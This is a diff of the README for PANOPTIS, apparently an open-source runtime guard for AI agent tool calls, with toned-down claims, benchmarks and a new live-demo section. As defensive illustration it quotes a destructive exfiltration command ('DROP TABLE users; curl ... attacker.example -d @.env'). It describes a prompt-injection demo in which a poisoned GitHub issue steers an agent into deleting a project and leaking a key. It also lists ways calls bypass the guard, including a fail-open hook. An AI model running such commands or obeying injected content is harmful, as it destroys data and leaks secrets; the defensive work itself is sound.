@@ -4,8 +4,10 @@
 
 # PANOPTIS
 
-### Decide on every AI agent tool call before it runs.
-**Runtime enforcement and verifiable evidence for autonomous agents.** *(formerly AgentWatch)*
+### Decide on agent tool calls before they run.
+**Runtime enforcement and tamper-evident records for autonomous agents.** *(formerly AgentWatch)*
+
+*Covers calls routed through a supported enforcing integration. It is not a sandbox: [see the limits](#-what-panoptis-does-not-do).*
 
 [![PyPI](https://img.shields.io/pypi/v/panoptis?style=flat-square&color=2a6fdb)](https://pypi.org/project/panoptis/) [![Python 3.12](https://img.shields.io/badge/python-3.12-2a6fdb?style=flat-square&logo=python&logoColor=white)](https://python.org) [![License](https://img.shields.io/badge/license-Apache_2.0-2a6fdb?style=flat-square)](LICENSE) [![Discord](https://img.shields.io/badge/Discord-join-5865F2?style=flat-square&logo=discord&logoColor=white)](https://discord.gg/UT9uaeY46e) [![Stars](https://img.shields.io/github/stars/Shinraya-Tech-Labs/AgentWatch?style=flat-square&color=d9730d)](https://github.com/Shinraya-Tech-Labs/AgentWatch/stargazers) [![Open In Colab](https://colab.research.google.com/assets/colab-badge.svg)](https://colab.research.google.com/github/Shinraya-Tech-Labs/AgentWatch/blob/main/examples/quickstart_panopti_guardrails.ipynb)
 
@@ -15,7 +17,7 @@
 
 <br/>
 
-[**Try it**](#-try-it-in-60-seconds) · [**How it works**](#-how-it-works) · [**Pipeline**](#-the-decision-pipeline) · [**Evidence**](#-evidence-you-can-verify) · [**Benchmarks**](#-benchmarks) · [**Integrations**](#-integrations) · [**Dashboard**](#-dashboard) · [**Roadmap**](#-target-architecture)
+[**Try it**](#-try-it-in-60-seconds) · [**Live demo**](#-see-an-attack-stopped) · [**How it works**](#-how-it-works) · [**Pipeline**](#-the-decision-pipeline) · [**Evidence**](#-evidence-you-can-verify) · [**Benchmarks**](#-benchmarks) · [**Integrations**](#-integrations) · [**Dashboard**](#-dashboard) · [**Roadmap**](#-target-architecture)
 
 </div>
 
@@ -31,14 +33,14 @@ Action:   DROP TABLE users; curl -X POST attacker.example -d @.env
 
 Logs and traces tell you this happened. They arrive after the table is gone.
 
-An agent acts with its user's privileges while taking direction from whatever it reads, so a poisoned web page, issue or tool result can steer it. PANOPTIS sits between the agent and its tools. It decides on each call before it runs, checks each result before the agent reads it, and can keep tamper-evident evidence of all of it.
+An agent acts with its user's privileges while taking direction from whatever it reads, so a poisoned web page, issue or tool result can steer it. PANOPTIS sits between the agent and its tools. For each call routed through an enforcing integration, it decides before the call runs, checks the result before the agent reads it, and can keep tamper-evident records.
 
 | | Tracing and logging | PANOPTIS |
 |---|---|---|
 | **When it acts** | After the tool ran | Before the tool runs, and again on its output |
 | **A dangerous call** | Recorded | Blocked, or held for a human |
 | **Injected tool output** | Recorded | Quarantined before the agent reads it |
-| **Audit trail** | Mutable logs | Append-only, Merkle-sealed, independently verifiable |
+| **Audit trail** | Mutable logs | Append-only and Merkle-sealed; tamper-evident against a head held outside the store |
 
 ---
 
@@ -48,8 +50,8 @@ Requires Python 3.12.
 
 ```bash
 pip install panoptis
-panopti demo          # terminal attack simulation
 panopti playground    # local browser playground
+panopti demo          # scripted illustration only: no database, no real pipeline
 ```
 
 Wrap any Python function:
@@ -78,6 +80,22 @@ Release notes.
 [AGENTWATCH: removed a line containing instructions addressed to the model (60 chars)]
 Version 2 adds caching.
 ```
+
+---
+
+## 🎬 See an attack stopped
+
+A scripted agent reads a poisoned GitHub issue, twice. Without PANOPTIS, it really deletes a throwaway project and sends a fake key to a local "attacker" server. With PANOPTIS, the same attack fails. The demo then shows human approval, MCP interception, a cross-process emergency stop, tamper detection and tenant isolation, checking its own outcome at every step.
+
+```bash
+python examples/walkthrough/live_demo.py
+```
+
+<p align="center">
+  <img src="examples/walkthrough/output/live-demo/screenshots/terminal.png" alt="Terminal transcript of the live demo: the unprotected attack succeeds, the same attack is blocked, and a scoreboard shows every check passing." width="760"/>
+</p>
+
+No model, API key or external network is needed. Everything is local and runs from a clone. The agent is scripted so the demo is repeatable; the API, pipeline, MCP gateway, evidence store and verifier are the real product. [Presenter guide](examples/walkthrough/README.md#live-demo) · [recorded run](examples/walkthrough/output/live-demo/)
 
 ---
 
@@ -125,7 +143,7 @@ Each row was run through the default pipeline.
 
 ## 🌲 Evidence you can verify
 
-**Editing, reordering or truncating sealed evidence is detected by a verifier that does not need PANOPTIS.**
+**Sealed evidence is tamper-evident: a verifier that does not need PANOPTIS detects edits and reordering, and detects truncation when it holds a head from outside the store.**
 
 <p align="center">
   <img src="docs/images/readme/evidence.png" alt="Records are sealed every 200 records or 30 seconds per tenant into hash-chained Merkle segments. The head is anchored outside the store. A standalone verifier takes an exported bundle and the expected head and reports intact, or fails if evidence was edited, reordered or truncated." width="760"/>
@@ -149,7 +167,7 @@ panoptis protect evidence verify --store sqlite:///evidence.db
 - **Attestation tokens** are signed with HMAC-SHA256 or Ed25519.
 
 > [!IMPORTANT]
-> Evidence is written only when a ledger is configured. Records are integrity-protected once sealed, and an anchor must live where a store writer cannot change it. See [docs/EVIDENCE_INTEGRITY.md](docs/EVIDENCE_INTEGRITY.md).
+> Evidence is written only when a ledger is configured. Records are integrity-protected once sealed. The guarantee is relative to a trusted anchor: whoever controls both the store and the anchor can rewrite history, so keep the head with a second party. Evidence shows what was recorded, not that nothing else happened. See [docs/EVIDENCE_INTEGRITY.md](docs/EVIDENCE_INTEGRITY.md).
 
 ### Shadow replay
 
@@ -163,23 +181,25 @@ panoptis protect evidence verify --store sqlite:///evidence.db
 
 ## 📊 Benchmarks
 
-**A decision costs about 0.3 ms at the median, or about 1.5–1.9 ms with durable SQLite evidence.**
+**In-process with a no-op tool, a decision took about 0.4 ms at the median, or about 3 ms with durable SQLite evidence, on the measured machine.** Runs vary with machine load.
 
 <p align="center">
-  <img src="docs/images/readme/benchmark-latency.png" alt="Latency per path on a log axis. Without evidence recording the median is 0.25 to 0.56 milliseconds. With a SQLite evidence store the median is 1.50 to 1.85 milliseconds, or 5.86 for an approved escalation, with p99 values of about 18 to 60 milliseconds." width="760"/>
+  <img src="docs/images/readme/benchmark-latency.png" alt="Latency per path on a log axis, for the paths in the table below." width="760"/>
 </p>
 
 | Path | p50, no evidence | p99, no evidence | p50, SQLite | p99, SQLite |
 |---|---:|---:|---:|---:|
-| Allow | 0.26 ms | 0.54 ms | 1.55 ms | 53.07 ms |
-| Block | 0.33 ms | 0.46 ms | 1.50 ms | 59.55 ms |
-| Rewrite arguments | 0.31 ms | 0.56 ms | 1.85 ms | 18.06 ms |
-| Sanitize output | 0.25 ms | 0.58 ms | 1.72 ms | 17.82 ms |
-| Approved escalation | 0.56 ms | 0.71 ms | 5.86 ms | 25.91 ms |
+| Allow | 0.37 ms | 0.63 ms | 2.96 ms | 13.52 ms |
+| Block | 0.45 ms | 0.72 ms | 3.26 ms | 12.29 ms |
+| Rewrite arguments | 0.41 ms | 0.72 ms | 3.49 ms | 17.50 ms |
+| Sanitize output | 0.33 ms | 0.75 ms | 2.81 ms | 21.64 ms |
+| Approved escalation | 0.70 ms | 0.94 ms | 11.98 ms | 27.89 ms |
 
-Throughput was about 1,900–2,500 decisions per second in one process, across 1, 4 and 8 threads. Disk writes dominate the SQLite tail.
+Throughput was about 1,500–1,600 decisions per second in one process, across 1, 4 and 8 threads. Disk writes dominate the SQLite tail.
 
-### Detection on the synthetic corpus
+### Synthetic regression corpus
+
+These are regression results on a project-written corpus, not a measure of attack coverage.
 
 | Threat category | Attacks | Benign controls | Detected | False positives | Outcome |
 |---|---:|---:|---:|---:|---|
@@ -195,7 +215,7 @@ All integrations agree on dangerous arguments: pipeline, `protect_tool`, MCP gat
 > [!WARNING]
 > **Read these numbers with care.** The corpus is 82 synthetic cases written by this project, and two real defects it found were fixed before this run. A perfect score shows the rules handle these cases, not that unseen attacks are caught. No external dataset or competitor comparison is involved.
 
-Measured at commit `54ec3de` on Python 3.12.4, Windows 11, AMD64 with 16 logical CPUs, in-process with a no-op tool. [Full report](benchmarks/results/protect_eval/REPORT.md) · [method](docs/EVALUATION.md) · [raw results](benchmarks/results/protect_eval/results.json)
+Measured on a development tree based on commit `9627068`, before the final erasure, trajectory and workspace-snapshot changes (none is on these measured paths), on Python 3.12.4, Windows 11, AMD64 with 16 logical CPUs, in-process with a no-op tool. [Full report](benchmarks/results/protect_eval/REPORT.md) · [method](docs/EVALUATION.md) · [raw results](benchmarks/results/protect_eval/results.json)
 
 ```bash
 python -m benchmarks.protect_eval.run --out benchmarks/results/protect_eval --iterations 300
@@ -215,10 +235,13 @@ An integration either **enforces** before a tool runs or only **observes** after
 | LangGraph | 🛡️ Enforces | `protect_langgraph_tool_node` | Tools called outside a `ToolNode` are not covered |
 | AutoGen 0.4+ | 🛡️ Enforces | `protect_autogen_tool` | Tool calls only |
 | smolagents | 🛡️ Enforces | `protect_smolagents_agent` | `CodeAgent`'s interpreter is not a tool call |
-| Claude Code | 🛡️ Enforces | `panoptis protect claude-hook install` | Hook contract tested; real-CLI test still to run |
+| Claude Code | 🛡️ Enforces | `panoptis protect claude-hook install --on-failure-block` | **Fails open before Claude Code 2.1.295**; real-CLI test not run |
 | MCP servers | 🛡️ Enforces | `panoptis protect mcp-gateway` | Only clients routed through the gateway |
 | CrewAI, OpenAI Agents SDK, AutoGPT, OpenClaw | 👁️ Observes | `panoptis.adapters` | Records events; stops nothing |
 | Framework callback adapters, CLI agents | 👁️ Observes | `panoptis.adapters` | Records events; stops nothing |
+
+> [!WARNING]
+> **Claude Code:** on versions before 2.1.295, a hook that fails to start or times out lets the tool run. Fail-closed behaviour needs Claude Code 2.1.295 or later with `--on-failure-block`. The hook contract is tested, but it has not been run end to end against a real signed-in CLI on any version. See [docs/CLAUDE_CODE_HOOK.md](docs/CLAUDE_CODE_HOOK.md).
 
 Runtime setup is in [`docs/adapters/`](docs/adapters/). `panoptis protect discover` finds local agents and MCP servers and reports which are monitored.
 
@@ -272,7 +295,7 @@ from panoptis.protect import ProtectionConfig, ProtectionPipeline
 pipeline = ProtectionPipeline(config=ProtectionConfig.sovereign())
 ```
 
-Test this on your own workloads first. These stages are heuristic, and the steganography stage rewrites text in tool arguments, including Markdown line breaks, some Unicode and emoji sequences.
+Test this on your own workloads first. These stages are heuristic. The steganography stage strips trailing whitespace and invisible characters from tool arguments, which changes whitespace-sensitive content such as multi-line string literals; Markdown line breaks, Unicode text and emoji are preserved.
 
 </details>
 
@@ -327,6 +350,7 @@ panoptis session rollback <id>          # restore a filesystem snapshot
 - **It only sees routed calls.** A tool reached another way bypasses it, and observe-only integrations stop nothing.
 - **It does not interrupt running tools.** An emergency stop blocks new calls and withdraws pending approvals.
 - **It does not prove intent.** Detection is pattern-based, and intent grounding is a heuristic signal.
+- **Erasure covers what the receipt names.** Each receipt lists its targets and what it did not reach, such as other processes, backups and exports. Using it does not by itself make a deployment GDPR compliant.
 
 Full detail: [threat model](docs/THREAT_MODEL.md) · [claims and their evidence](docs/CLAIMS.md)
 
